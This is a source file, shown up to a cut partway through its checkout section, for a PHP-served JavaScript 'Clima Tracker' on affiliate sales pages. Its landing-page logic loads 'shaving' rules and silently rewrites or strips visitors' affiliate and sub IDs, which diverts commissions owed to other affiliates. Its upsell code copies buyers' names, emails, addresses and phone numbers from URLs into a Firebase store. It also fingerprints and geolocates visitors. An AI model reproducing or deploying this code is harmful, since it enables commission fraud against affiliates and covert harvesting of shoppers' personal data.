<?php
/**
 * Clima Tracker SDK — ct.php
 * Unified tracking script for all page types
 * Usage: <script src="ct.php?t=lp&c=BASE64_CONFIG&d=DOMAIN_KEY"></script>
 *
 * t = type: lp (landing), up (upsell), co (checkout), ty (thankyou)
 * c = base64url-encoded JSON config
 * d = domain key (only for landing page with traffic filtering)
 */

header('Content-Type: application/javascript; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, OPTIONS');
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { exit(0); }

$type      = $_GET['t'] ?? 'lp';
$domainKey = trim($_GET['d'] ?? '');

// Decode base64url config
$configRaw = base64_decode(strtr($_GET['c'] ?? '', '-_', '+/'));
$cfg = json_decode($configRaw, true) ?? [];

$FB          = addslashes($cfg['fb']          ?? '');
$OID         = addslashes($cfg['oid']         ?? '');
$VCODES      = addslashes($cfg['vcodes']      ?? '');
$LINK_DOMAIN = addslashes($cfg['linkDomain']  ?? '');
$PROXY       = addslashes($cfg['proxy']       ?? '');
$IPQS_KEY    = addslashes($cfg['ipqsKey']     ?? '');
$PC_KEY      = addslashes($cfg['pcKey']       ?? '');
$ABUSE_KEY   = addslashes($cfg['abuseKey']    ?? '');
$VMAP_JSON   = json_encode($cfg['vmap'] ?? [], JSON_UNESCAPED_UNICODE);

// Build tracker API URL (same server, /shaver/api.php)
$protocol    = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
$host        = $_SERVER['HTTP_HOST'] ?? 'plan1.climaofficial.com';
$TRACKER_API = $protocol . '://' . $host . '/shaver/api.php';

// For landing page: fetch active rules from MySQL
$rules     = [];
$domain    = null;
$domainId  = 0;

if ($type === 'lp' && $domainKey !== '') {
    try {
        require_once __DIR__ . '/shaver/config.php';
        $pdo = getDB();

        $stmt = $pdo->prepare("SELECT * FROM domains WHERE domain_key = ? AND status = 'active'");
        $stmt->execute([$domainKey]);
        $domain = $stmt->fetch();

        if ($domain) {
            $domainId = (int)$domain['id'];
            $stmt2 = $pdo->prepare("SELECT id, aff_id, sub_id, mode, replace_aff_id, replace_sub_id FROM shaving_sessions WHERE domain_id = ? AND active = 1");
            $stmt2->execute([$domainId]);
            $rows = $stmt2->fetchAll();
            foreach ($rows as $r) {
                $rules[] = [
                    'id'           => $r['id'],
                    'affId'        => $r['aff_id'],
                    'subId'        => $r['sub_id'] ?? '',
                    'replaceMode'  => ($r['mode'] === 'replace'),
                    'replaceAffId' => $r['replace_aff_id'] ?? '',
                    'replaceSubId' => $r['replace_sub_id'] ?? ''
                ];
            }
        }
    } catch (Exception $e) {
        // DB error — continue without filtering
    }
}

$RULES_JSON = json_encode($rules);
$BG_ACCOUNT_ID      = addslashes($domain['bg_account_id']      ?? '');
$BG_PRODUCT_CODES   = addslashes($domain['bg_product_codes']   ?? '');
$BG_CONVERSION_TOKEN= addslashes($domain['bg_conversion_token']?? '');
$DOMAIN_KEY_JS      = addslashes($domainKey);
$HAS_DOMAIN = ($domain !== null) ? 'true' : 'false';
?>
/* CT - <?php echo htmlspecialchars($type); ?> */
(function(){
'use strict';

var FB='<?php echo $FB; ?>';
var OID='<?php echo $OID; ?>';
var VCODES='<?php echo $VCODES; ?>';
var VMAP=<?php echo $VMAP_JSON; ?>;
var LINK_DOMAIN='<?php echo $LINK_DOMAIN; ?>';
var PROXY='<?php echo $PROXY; ?>';
var IPQS_KEY='<?php echo $IPQS_KEY; ?>';
var PC_KEY='<?php echo $PC_KEY; ?>';
var ABUSE_KEY='<?php echo $ABUSE_KEY; ?>';
var WORKER='https://ipqs-proxy.labibahmed32.workers.dev';
var P=new URLSearchParams(location.search);

function _detectAff(){return P.get('aff_id')||P.get('affid')||P.get('hop')||P.get('affiliate')||P.get('vendor')||P.get('tid')||P.get('affiliate_id')||'';}
function _allParams(){var o={};P.forEach(function(v,k){if(v)o[k]=v.substr(0,200);});return o;}
function _extractBGData(){return{email:P.get('emailaddress')||'',name:P.get('creditcards_name')||'',address:P.get('address')||'',city:P.get('city')||'',zip:P.get('zip')||'',phone:P.get('phone')||'',country:P.get('country')||'',orderId:P.get('order_id')||'',orderIdGlobal:P.get('order_id_global')||'',total:P.get('total')||''};}
function _stableHash(s){var h=0;for(var i=0;i<s.length;i++){var c=s.charCodeAt(i);h=((h<<5)-h)+c;h=h&h;}return Math.abs(h).toString(36);}
/* Eastern Time date helper (America/New_York — Florida) */
function _etDate(){try{var s=new Date().toLocaleString('en-US',{timeZone:'America/New_York'});return new Date(s);}catch(e){return new Date();}}
function _etDateStr(){var d=_etDate();return d.getFullYear()+'-'+String(d.getMonth()+1).padStart(2,'0')+'-'+String(d.getDate()).padStart(2,'0');}

/* Sale notification helper — sends Telegram + Email via notify.php */
function _notifySale(sale){
  try{fetch(FB+'/tracker/settings.json').then(function(r){return r.json();}).then(function(cfg){
    if(!cfg)return;
    var body={sale:sale,firebase_url:FB};
    if(cfg.tgEnabled&&cfg.tgBotToken&&cfg.tgChatIds){
      body.tg_token=cfg.tgBotToken;
      body.tg_chat_ids=cfg.tgChatIds.split(',').map(function(s){return s.trim();}).filter(Boolean);
    }
    if(cfg.emailEnabled&&cfg.emailTo){
      body.email_to=cfg.emailTo;
      body.email_from=cfg.emailFrom||'noreply@climaofficial.com';
    }
    if(!body.tg_token&&!body.email_to)return;
    if(cfg.ipqsKey)body.ipqs_key=cfg.ipqsKey;
    if(cfg.phpProxyUrl)body.proxy_url=cfg.phpProxyUrl;
    var notifyUrl=(cfg.shaverApiUrl||cfg.trackerApiUrl||'').replace('api.php','notify.php');
    if(notifyUrl)fetch(notifyUrl,{method:'POST',body:JSON.stringify(body),headers:{'Content-Type':'application/json'},keepalive:true});
  }).catch(function(){});}catch(e){}
}

<?php if ($type === 'lp'): ?>
/* ===== LANDING PAGE ===== */
/* Traffic rules */
var _rules=<?php echo $RULES_JSON; ?>;
var _domainId=<?php echo $domainId; ?>;
var _domainKey='<?php echo $DOMAIN_KEY_JS; ?>';
var _tApi='<?php echo addslashes($TRACKER_API); ?>';
var _hasDomain=<?php echo $HAS_DOMAIN; ?>;
var BG_ACCOUNT_ID='<?php echo $BG_ACCOUNT_ID; ?>';
var BG_PRODUCT_CODES='<?php echo $BG_PRODUCT_CODES; ?>';
var BG_CONVERSION_TOKEN='<?php echo $BG_CONVERSION_TOKEN; ?>';

/* Mark start of upsell counter */
try{sessionStorage.setItem('_ct_unum','0');}catch(e){}

/* Rule matching */
function _matchRule(affId,subId){for(var i=0;i<_rules.length;i++){var s=_rules[i];if(s.affId===affId){if(s.subId&&s.subId!==subId)continue;return s;}}return null;}

/* Apply rule */
function _applyRule(rule){var url=new URL(window.location.href);if(rule.replaceMode){url.searchParams.set('aff_id',rule.replaceAffId);if(rule.replaceSubId)url.searchParams.set('subid',rule.replaceSubId);else url.searchParams.delete('subid');}else{url.searchParams.delete('aff_id');url.searchParams.delete('affid');url.searchParams.delete('subid');url.searchParams.delete('sub_id');}window.history.replaceState({},'',url.toString());}

/* API call helper */
function _tPost(action,data){var xhr=new XMLHttpRequest();xhr.open('POST',_tApi,true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify(Object.assign({action:action},data)));return xhr;}

/* Visit log */
function _logVisit(affId,subId,wasFiltered,ruleId,source){if(!affId)return;var xhr=new XMLHttpRequest();xhr.open('POST',_tApi,true);xhr.setRequestHeader('Content-Type','application/json');xhr.onreadystatechange=function(){if(xhr.readyState===4&&xhr.status===200){try{var r=JSON.parse(xhr.responseText);if(r.success&&r.traffic_id&&window.__ct_beh){window.__ct_beh.trafficId=r.traffic_id;window.__ct_beh.eventQueue.forEach(function(ev){_logBeh(ev.type,ev.data);});window.__ct_beh.eventQueue=[];}}catch(e){}}};xhr.send(JSON.stringify({action:'log_visit',domain_id:_domainId,aff_id:affId,sub_id:subId,page_url:window.location.href,referrer:source||document.referrer||'direct',user_agent:navigator.userAgent,filtered:wasFiltered,rule_id:ruleId,session_uuid:window.__ct_beh?window.__ct_beh.uuid:null,screen_width:window.screen.width,screen_height:window.screen.height,viewport_width:window.innerWidth,viewport_height:window.innerHeight}));}

/* Behavior tracking */
function _behUUID(){var u=null;try{u=sessionStorage.getItem('_ct_beh_id');}catch(e){}if(!u){u='bs_'+Date.now()+'_'+Math.random().toString(36).substr(2,9);try{sessionStorage.setItem('_ct_beh_id',u);}catch(e){}}return u;}
window.__ct_beh={uuid:_behUUID(),trafficId:null,landedAt:Date.now(),maxScroll:0,clicks:0,checkout:false,eventQueue:[],isVisible:true,firstClick:null,checkoutTime:null,checkoutUrl:null,pgLoad:window.performance?(window.performance.timing.loadEventEnd-window.performance.timing.navigationStart):null};
function _logBeh(type,data){if(!window.__ct_beh.trafficId){window.__ct_beh.eventQueue.push({type:type,data:data});return;}var xhr=new XMLHttpRequest();xhr.open('POST',_tApi,true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({action:'lbe',domain_id:_domainId,traffic_id:window.__ct_beh.trafficId,session_uuid:window.__ct_beh.uuid,event_type:type,event_data:data,timestamp:new Date().toISOString()}));}
function _updateMetrics(){if(!window.__ct_beh.trafficId)return;var dur=Math.floor((Date.now()-window.__ct_beh.landedAt)/1000);var xhr=new XMLHttpRequest();xhr.open('POST',_tApi,true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({action:'usm',traffic_id:window.__ct_beh.trafficId,session_duration:dur,max_scroll_depth:window.__ct_beh.maxScroll,total_clicks:window.__ct_beh.clicks,reached_checkout:window.__ct_beh.checkout?1:0,checkout_url:window.__ct_beh.checkoutUrl||null,time_to_first_click:window.__ct_beh.firstClick?Math.floor((window.__ct_beh.firstClick-window.__ct_beh.landedAt)/1000):null,time_to_checkout:window.__ct_beh.checkoutTime?Math.floor((window.__ct_beh.checkoutTime-window.__ct_beh.landedAt)/1000):null,screen_width:window.screen.width,screen_height:window.screen.height,viewport_width:window.innerWidth,viewport_height:window.innerHeight,page_load_time:window.__ct_beh.pgLoad,bounce:window.__ct_beh.clicks===0?1:0}));}

/* Setup behavior events */
(function(){
  /* Scroll */
  var _st,_ld=0;window.addEventListener('scroll',function(){clearTimeout(_st);_st=setTimeout(function(){var sy=window.scrollY||window.pageYOffset,dh=document.documentElement.scrollHeight,vh=window.innerHeight;var sd=Math.min(100,Math.floor(((sy+vh)/dh)*100));if(sd>window.__ct_beh.maxScroll){window.__ct_beh.maxScroll=sd;if(sd>=25&&_ld<25)_logBeh('scroll',{scrollDepth:25,milestone:true});else if(sd>=50&&_ld<50)_logBeh('scroll',{scrollDepth:50,milestone:true});else if(sd>=75&&_ld<75)_logBeh('scroll',{scrollDepth:75,milestone:true});else if(sd>=90&&_ld<90)_logBeh('scroll',{scrollDepth:90,milestone:true});_ld=sd;}},300);});
  /* Click */
  document.addEventListener('click',function(e){var t=e.target;while(t&&t!==document.body){if(t.tagName==='A'||t.tagName==='BUTTON'||(t.classList&&(t.classList.contains('cp-btn')||t.classList.contains('mt-buy-now-btn')))){window.__ct_beh.clicks++;if(!window.__ct_beh.firstClick)window.__ct_beh.firstClick=Date.now();var bt=t.textContent?t.textContent.trim():'';_logBeh('click',{buttonText:bt.substr(0,100),buttonId:t.id||'',targetUrl:(t.href||'').substr(0,200),clickX:e.clientX,clickY:e.clientY,scrollDepthAtClick:window.__ct_beh.maxScroll,timeFromLanding:Math.floor((Date.now()-window.__ct_beh.landedAt)/1000)});break;}t=t.parentElement;}});
  /* Hover on buy buttons */
  var _hs=null,_hb=null;document.addEventListener('mouseover',function(e){var t=e.target;while(t&&t!==document.body){if(t.classList&&(t.classList.contains('cp-btn')||t.classList.contains('mt-buy-now-btn'))){_hs=Date.now();_hb=t;break;}t=t.parentElement;}});document.addEventListener('mouseout',function(){if(_hb&&_hs){var d=Date.now()-_hs;if(d>500)_logBeh('hover',{element:'buy-btn',buttonText:(_hb.textContent||'').trim().substr(0,100),duration:d});_hs=null;_hb=null;}});
  /* Checkout detection */
  document.addEventListener('click',function(e){var t=e.target;while(t&&t!==document.body){if(t.href&&t.href.indexOf('buygoods.com')!==-1){if(!window.__ct_beh.checkout){window.__ct_beh.checkout=true;window.__ct_beh.checkoutUrl=t.href;window.__ct_beh.checkoutTime=Date.now();_logBeh('checkout_reached',{checkoutUrl:t.href.substr(0,200),timeToCheckout:Math.floor((Date.now()-window.__ct_beh.landedAt)/1000),scrollDepthAtCheckout:window.__ct_beh.maxScroll,clicksBeforeCheckout:window.__ct_beh.clicks});}break;}t=t.parentElement;}});
  /* Tab visibility */
  var _vs=Date.now();document.addEventListener('visibilitychange',function(){if(document.hidden){_logBeh('tab_hidden',{visibleDuration:Date.now()-_vs});window.__ct_beh.isVisible=false;}else{_logBeh('tab_visible',{});window.__ct_beh.isVisible=true;_vs=Date.now();}});
  /* Before unload */
  window.addEventListener('beforeunload',function(){_updateMetrics();if(navigator.sendBeacon&&window.__ct_beh.trafficId){navigator.sendBeacon(_tApi,JSON.stringify({action:'usm',traffic_id:window.__ct_beh.trafficId,session_duration:Math.floor((Date.now()-window.__ct_beh.landedAt)/1000),max_scroll_depth:window.__ct_beh.maxScroll,total_clicks:window.__ct_beh.clicks,reached_checkout:window.__ct_beh.checkout?1:0}));}});
  setInterval(_updateMetrics,30000);
})();

/* Main filtering logic */
var _params=new URLSearchParams(location.search);
var _affId=_params.get('aff_id')||_params.get('affid')||'';
var _subId=_params.get('subid')||_params.get('sub_id')||'';
var _utmSrc=_params.get('utm_source')||_params.get('source')||_params.get('ref')||'';
var _mr=null,_oa='',_os='';

if(_hasDomain&&_affId){
  var _matched=_matchRule(_affId,_subId);
  if(_matched){_logVisit(_affId,_subId,true,_matched.id,_utmSrc);_applyRule(_matched);_tPost('tv',{session_id:_matched.id,domain_id:_domainId,aff_id:_affId,sub_id:_subId,page:window.location.href,referrer:document.referrer||'direct'});var _mr=_matched;var _oa=_affId;var _os=_subId;}else{_logVisit(_affId,_subId,false,null,_utmSrc);}
}else if(_hasDomain&&!_affId){_logVisit('',_subId,false,null,_utmSrc);}

/* BuyGoods tracking injection */
function ReadCookie(n){n+='=';var p=document.cookie.split(/;\s*/);for(var i=0;i<p.length;i++)if(p[i].indexOf(n)===0)return p[i].substring(n.length);return '';}
window.ReadCookie=ReadCookie;
if(BG_ACCOUNT_ID&&BG_PRODUCT_CODES){
  var _bgSrc='https://tracking.buygoods.com/track/?a='+BG_ACCOUNT_ID+'&firstcookie=0&tracking_redirect=&referrer='+encodeURIComponent(document.referrer)+'&sessid2='+ReadCookie('sessid2')+'&product='+BG_PRODUCT_CODES+'&vid1=&vid2=&vid3=&caller_url='+encodeURIComponent(window.location.href);
  var _bgEl=document.createElement('script');_bgEl.type='text/javascript';_bgEl.defer=true;_bgEl.src=_bgSrc;document.head.appendChild(_bgEl);
}
if(BG_ACCOUNT_ID&&BG_CONVERSION_TOKEN){
  function _injectConvIframe(){var i=document.createElement('iframe');i.async=true;i.style.display='none';i.setAttribute('src','https://buygoods.com/affiliates/go/conversion/iframe/bg?a='+BG_ACCOUNT_ID+'&t='+BG_CONVERSION_TOKEN+'&s='+ReadCookie('sessid2'));document.body.appendChild(i);}
  if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',function(){setTimeout(_injectConvIframe,1000);});else setTimeout(_injectConvIframe,1000);
}
/* Buy button click tracking (for filtered traffic) */
function _setupBuyClicks(){if(!_mr)return;var btns=document.querySelectorAll('.cp-btn,.mt-buy-now-btn,a[href*="buygoods.com"]');btns.forEach(function(b){b.addEventListener('click',function(){_tPost('tc',{session_id:_mr.id,domain_id:_domainId,aff_id:_oa,sub_id:_os,page:window.location.href});});});}
if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',_setupBuyClicks);else _setupBuyClicks();

console.log('%c✓ Clima Tracker initialized','color:#0A6C80;font-weight:bold;');
if(BG_ACCOUNT_ID&&BG_PRODUCT_CODES)console.log('%c✓ BuyGoods tracking injected','color:#28a745;font-weight:bold;');
/* ===== Clima Landing Tracker ===== */
(function(){
  var sid=localStorage.getItem('_ct_sid');
  if(!sid){sid='v'+Date.now().toString(36)+Math.random().toString(36).substr(2,5);localStorage.setItem('_ct_sid',sid);}
  var aff=P.get('aff_id')||P.get('affid')||localStorage.getItem('_ct_aff')||'';
  if(aff)localStorage.setItem('_ct_aff',aff);
  var sub1=P.get('sub1')||P.get('subid')||'',sub2=P.get('sub2')||P.get('subid2')||'';
  var ua=navigator.userAgent,mob=/Mobile|Android|iPhone/i.test(ua);
  var br=(/Chrome/i.test(ua)?'Chrome':/Firefox/i.test(ua)?'Firefox':/Safari/i.test(ua)?'Safari':'Other');
  var os=(/Windows/i.test(ua)?'Windows':/Mac/i.test(ua)?'Mac':/Android/i.test(ua)?'Android':/iPhone|iPad/i.test(ua)?'iOS':/Linux/i.test(ua)?'Linux':'Other');
  var scrollMax=0,startTime=Date.now(),buyClicked=false,variant='';
  var ds=_etDateStr();
  var ipData={ip:'',ipv4:'',ipv6:'',country:'',city:'',isp:'',countryCode:'',region:'',zip:'',lat:0,lon:0,timezone:'',asn:'',languages:''};
  function _setGeo(d){ipData.ip=d.ip||ipData.ip;ipData.country=d.country||'';ipData.countryCode=d.countryCode||d.country_code||'';ipData.region=d.region||'';ipData.city=d.city||'';ipData.zip=d.zip||d.postal||'';ipData.lat=d.lat||d.latitude||0;ipData.lon=d.lon||d.longitude||0;ipData.timezone=d.timezone||((d.timezone&&d.timezone.id)?d.timezone.id:'');ipData.isp=d.isp||d.org||'';ipData.asn=d.asn||'';if(d.ip&&d.ip.indexOf(':')>-1)ipData.ipv6=d.ip;else if(d.ip)ipData.ipv4=d.ip;}
  fetch(WORKER+'?geo=1').then(function(r){return r.json();}).then(function(d){if(d.ip&&d.country){_setGeo(d);try{localStorage.setItem('_ct_ip',d.ip);if(d.ip.indexOf(':')===-1)localStorage.setItem('_ct_ipv4',d.ip);}catch(e){}_ctSend();return;}throw 'no geo';}).catch(function(){fetch('https://ipwho.is/').then(function(r){return r.json();}).then(function(d){if(d.ip&&d.success!==false){ipData.ip=d.ip;ipData.country=d.country||'';ipData.countryCode=d.country_code||'';ipData.region=d.region||'';ipData.city=d.city||'';ipData.timezone=(d.timezone&&d.timezone.id)?d.timezone.id:'';ipData.isp=(d.connection&&d.connection.isp)?d.connection.isp:'';ipData.asn=(d.connection&&d.connection.asn)?'AS'+d.connection.asn:'';if(d.ip.indexOf(':')>-1)ipData.ipv6=d.ip;else ipData.ipv4=d.ip;try{localStorage.setItem('_ct_ip',d.ip);if(d.ip.indexOf(':')===-1)localStorage.setItem('_ct_ipv4',d.ip);}catch(e){}}_ctSend();}).catch(function(){_ctSend();});});
  fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){ipData.ipv4=d.ip||'';if(!ipData.ip)ipData.ip=d.ip||'';}).catch(function(){});
  fetch('https://api64.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){if(d.ip&&d.ip.indexOf(':')>-1)ipData.ipv6=d.ip;else if(!ipData.ipv4)ipData.ipv4=d.ip||'';if(!ipData.ip)ipData.ip=d.ip||'';}).catch(function(){});
  var _fp={tz:(typeof Intl!=='undefined')?Intl.DateTimeFormat().resolvedOptions().timeZone:'',lang:navigator.language||'',scr:screen.width+'x'+screen.height,plat:navigator.platform||'',cores:navigator.hardwareConcurrency||0,touch:'ontouchstart' in window,cookies:navigator.cookieEnabled,dnt:navigator.doNotTrack||''};
  function _checkScroll(){var sy=window.scrollY||window.pageYOffset||document.documentElement.scrollTop||document.body.scrollTop||0;var dh=Math.max(document.documentElement.scrollHeight||0,document.body.scrollHeight||0,document.documentElement.offsetHeight||0,document.body.offsetHeight||0);var vh=window.innerHeight||document.documentElement.clientHeight||0;if(dh>vh){var pct=Math.min(100,Math.round(((sy+vh)/dh)*100));if(pct>scrollMax)scrollMax=pct;}}
  window.addEventListener('scroll',_checkScroll,true);
  document.addEventListener('scroll',_checkScroll,true);
  setInterval(_checkScroll,2000);
  var platform=localStorage.getItem('_ct_platform')||'';
  if(!platform){if(P.get('aff_id')||P.get('affid'))platform='buygoods';else if(location.hash.indexOf('aff=')>-1)platform='digistore';}
  if(platform)localStorage.setItem('_ct_platform',platform);
  function _detectPlat(href){if(/buygoods\.com/i.test(href))return 'buygoods';if(/digistore24?\./i.test(href))return 'digistore';if(/clickbank\.(com|net)/i.test(href))return 'clickbank';return '';}
  document.addEventListener('click',function(e){var t=e.target.closest('a,button');if(!t)return;var txt=(t.textContent||'').trim().toLowerCase();var href=t.getAttribute('href')||'';if(LINK_DOMAIN&&href.indexOf(LINK_DOMAIN)>-1){buyClicked=true;platform=_detectPlat(href);if(platform)localStorage.setItem('_ct_platform',platform);if(VCODES){var m=href.match(/checkout\/([^\/?]+)/)||href.match(/product_codename=([^&]+)/);if(m&&VCODES.indexOf(m[1])>-1){variant=m[1];localStorage.setItem('_ct_var',variant);if(VMAP[variant])localStorage.setItem('_ct_amount',VMAP[variant].amount||0);}}localStorage.setItem('_ct_oid',OID);}else if(!LINK_DOMAIN&&/buy|order|get yours|add to cart|rush my/i.test(txt)){buyClicked=true;platform=_detectPlat(href);if(platform)localStorage.setItem('_ct_platform',platform);localStorage.setItem('_ct_oid',OID);}_ctLog('click',{el:t.tagName,text:txt.substr(0,50),href:href.substr(0,120)});_ctSend();});
  function _ctLog(action,extra){var d={action:action,ts:Date.now()};if(extra)for(var k in extra)d[k]=extra[k];fetch(FB+'/tracker/visitors/'+ds+'/'+sid+'/clicks.json',{method:'POST',body:JSON.stringify(d)});}
  if(LINK_DOMAIN){setTimeout(function(){var links=document.querySelectorAll('a[href*="'+LINK_DOMAIN+'"]');for(var i=0;i<links.length;i++){var h=links[i].getAttribute('href');if(h.indexOf('subid=')===-1)links[i].setAttribute('href',h+(h.indexOf('?')===-1?'?':'&')+'subid='+sid);}},2000);}
  try{localStorage.setItem('_ct_date',ds);}catch(e){}
  function _ctSend(){var d={ua:ua.substr(0,200),device:mob?'mobile':'desktop',browser:br,os:os,ref:document.referrer.substr(0,200),url:location.href.substr(0,300),affId:aff,subId:sid,sub1:sub1,sub2:sub2,offerId:OID,scrollMax:scrollMax,timeOnPage:Math.round((Date.now()-startTime)/1000),buyClicked:buyClicked,variant:variant,fingerprint:_fp,ts:Date.now()};if(platform)d.platform=platform;if(ipData.ip){d.ip=ipData.ip;try{localStorage.setItem('_ct_ip',ipData.ip);}catch(e){}}if(ipData.ipv4){d.ipv4=ipData.ipv4;try{localStorage.setItem('_ct_ipv4',ipData.ipv4);}catch(e){}}if(ipData.ipv6)d.ipv6=ipData.ipv6;if(ipData.country)d.country=ipData.country;if(ipData.countryCode)d.countryCode=ipData.countryCode;if(ipData.region)d.region=ipData.region;if(ipData.city)d.city=ipData.city;if(ipData.zip)d.zip=ipData.zip;if(ipData.lat)d.lat=ipData.lat;if(ipData.lon)d.lon=ipData.lon;if(ipData.timezone)d.timezone=ipData.timezone;if(ipData.isp)d.isp=ipData.isp;if(ipData.asn)d.asn=ipData.asn;fetch(FB+'/tracker/visitors/'+ds+'/'+sid+'.json',{method:'PATCH',body:JSON.stringify(d),keepalive:true});}
  _ctSend();
  setInterval(_ctSend,15000);
  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden')_ctSend();});
  window.addEventListener('pagehide',function(){_ctSend();});
})();

<?php elseif ($type === 'up'): ?>
/* ===== UPSELL PAGE ===== */
console.log('%c✓ Clima upsell tracking active','color:#0A6C80;font-weight:bold;');
(function(){
  /* Auto-detect upsell number via session counter */
  var unum=parseInt(sessionStorage.getItem('_ct_unum')||'0')+1;
  try{sessionStorage.setItem('_ct_unum',String(unum));}catch(e){}

  var sid=localStorage.getItem('_ct_sid')||'';
  var bgData=_extractBGData();
  var email=bgData.email;
  if(!sid&&email){sid='em_'+_stableHash(email);try{localStorage.setItem('_ct_sid',sid);}catch(e){}}
  /* Capture both global and local order IDs */
  var orderIdGlobal=P.get('order_id_global')||(function(){try{return localStorage.getItem('_ct_global_oid')||'';}catch(e){return'';}})();
  var orderIdLocal=P.get('order_id')||P.get('cbreceipt')||'';
  var orderId=orderIdGlobal||orderIdLocal;
  if(orderIdGlobal){try{localStorage.setItem('_ct_global_oid',orderIdGlobal);}catch(e){}}
  if(orderIdLocal){try{localStorage.setItem('_ct_up'+unum+'_oid',orderIdLocal);}catch(e){}}
  if(!sid&&orderId){sid='g_'+_stableHash(orderId);try{localStorage.setItem('_ct_sid',sid);}catch(e){}}
  if(!sid)sid=P.get('subid')||'';
  if(!sid)return;

  if(bgData.email||bgData.name||bgData.phone||bgData.address){var chk={};if(bgData.email)chk.email=bgData.email;if(bgData.name)chk.name=bgData.name;if(bgData.address)chk.address=bgData.address;if(bgData.city)chk.city=bgData.city;if(bgData.zip)chk.zip=bgData.zip;if(bgData.phone)chk.phone=bgData.phone;if(bgData.country)chk.billingCountry=bgData.country;if(bgData.total)chk.total=bgData.total;if(orderId)chk.orderId=orderId;fetch(FB+'/tracker/checkout-sessions/'+sid+'.json',{method:'PATCH',body:JSON.stringify(chk),keepalive:true});}

  var urlAff=_detectAff();
  if(urlAff){try{localStorage.setItem('_ct_aff',urlAff);}catch(e){}}

  if(unum===1){
    var saleKey=localStorage.getItem('_ct_saleKey')||'';
    if(!saleKey&&email){try{saleKey=localStorage.getItem('_ct_saleKey_'+email)||'';}catch(e){}}
    if(!saleKey){
      var aff=localStorage.getItem('_ct_aff')||'';
      var oid=localStorage.getItem('_ct_oid')||OID;
      var variant=localStorage.getItem('_ct_var')||'';
      var amount=0;
      if(variant&&VMAP[variant])amount=VMAP[variant].amount||0;
      if(!amount)amount=parseFloat(localStorage.getItem('_ct_amount'))||0;
      if(!amount&&bgData.total)amount=parseFloat(bgData.total)||0;
      if(!amount)amount=parseFloat(P.get('total'))||0;
      var ds=_etDateStr();
      saleKey='S'+Date.now().toString(36)+Math.random().toString(36).substr(2,4);
      var plat=localStorage.getItem('_ct_platform')||'';
      var sale={subId:sid,affId:aff,offerId:oid,variant:variant,orderId:orderIdLocal||orderId,orderIdGlobal:orderIdGlobal||'',amount:amount,platform:plat,date:ds,ts:Date.now(),status:'approved',source:'script'};
      if(urlAff)sale.affFromUrl=urlAff;
      if(bgData.email)sale.email=bgData.email;if(bgData.name)sale.bgName=bgData.name;if(bgData.phone)sale.bgPhone=bgData.phone;if(bgData.address)sale.bgAddress=bgData.address;if(bgData.city)sale.bgCity=bgData.city;if(bgData.zip)sale.bgZip=bgData.zip;if(bgData.country)sale.bgCountry=bgData.country;
      try{var _ip=localStorage.getItem('_ct_ipv4')||localStorage.getItem('_ct_ip')||'';if(_ip)sale.ip=_ip;}catch(e){}
      fetch(FB+'/tracker/sales/'+saleKey+'.json',{method:'PUT',body:JSON.stringify(sale)});
      _notifySale(sale);
      try{localStorage.setItem('_ct_sale_'+sid,'1');localStorage.setItem('_ct_saleKey',saleKey);if(email)localStorage.setItem('_ct_saleKey_'+email,saleKey);}catch(e){}
    }
  }

  var sk=localStorage.getItem('_ct_saleKey')||'';
  if(sk){try{localStorage.setItem('_ct_saleKey',sk);if(email)localStorage.setItem('_ct_saleKey_'+email,sk);}catch(e){}}
  if(sk&&orderId)fetch(FB+'/tracker/sales/'+sk+'.json',{method:'PATCH',body:JSON.stringify({orderId:orderId}),keepalive:true});

  var upData={num:unum,ts:Date.now(),loaded:true};
  if(orderId)upData.orderId=orderId;
  upData.urlParams=_allParams();
  fetch(FB+'/tracker/upsell-events/'+sid+'/'+unum+'.json',{method:'PATCH',body:JSON.stringify(upData),keepalive:true});

  document.addEventListener('click',function(e){var t=e.target.closest('a,button');if(!t)return;var href=(t.getAttribute('href')||'').toLowerCase();var txt=(t.textContent||'').trim().toLowerCase();var action='';if(href.indexOf('buygoods.com/secure/upsell')>-1||/yes|accept|upgrade|add|buy/i.test(txt))action='accept';else if(/no thank|skip|decline|no,? thank/i.test(txt))action='decline';if(!action)return;var clickHref=t.getAttribute('href')||'';var cOid='';try{var cp=new URLSearchParams(clickHref.split('?')[1]||'');cOid=cp.get('order_id')||cp.get('order_id_global')||'';}catch(e2){}var d={num:unum,action:action,ts:Date.now()};if(orderId)d.orderId=orderId;if(cOid)d.clickOrderId=cOid;fetch(FB+'/tracker/upsell-events/'+sid+'/'+unum+'.json',{method:'PATCH',body:JSON.stringify(d),keepalive:true});if(sk){var p={};p['upsell'+unum]=action;if(orderIdGlobal)p.orderIdGlobal=orderIdGlobal;if(orderIdLocal)p['upsell'+unum+'OrderId']=orderIdLocal;if(cOid&&cOid!==orderIdLocal)p['upsell'+unum+'ClickOrderId']=cOid;/* include previous upsell order IDs */for(var _ui=1;_ui<unum;_ui++){var _prev=null;try{_prev=localStorage.getItem('_ct_up'+_ui+'_oid');}catch(e){}if(_prev)p['upsell'+_ui+'OrderId']=_prev;}fetch(FB+'/tracker/sales/'+sk+'.json',{method:'PATCH',body:JSON.stringify(p),keepalive:true});}});
})();

<?php elseif ($type === 'co'): ?>
/* ===== CHECKOUT PAGE ===== */
console.log('%c✓ Clima checkout tracking active','color:#0A6C80;font-weight:bold;');
(function(){
  var sid=P.get('subid')||P.get('sub_id')||P.get('aff_sub')||'';
  if(!sid){try{sid=localStorage.getItem('_ct_sid')||'';}catch(e){}}
  var _globalOid=P.get('order_id_global')||'';
  if(!sid&&_globalOid)sid='g_'+_stableHash(_globalOid);
  if(!sid)sid='chk'+Date.now().toString(36)+Math.random().toString(36).substr(2,4);
  try{localStorage.setItem('_ct_sid',sid);}catch(e){}
  if(_globalOid){try{localStorage.setItem('_ct_global_oid',_globalOid);}catch(e){}}
  var startT=Date.now();
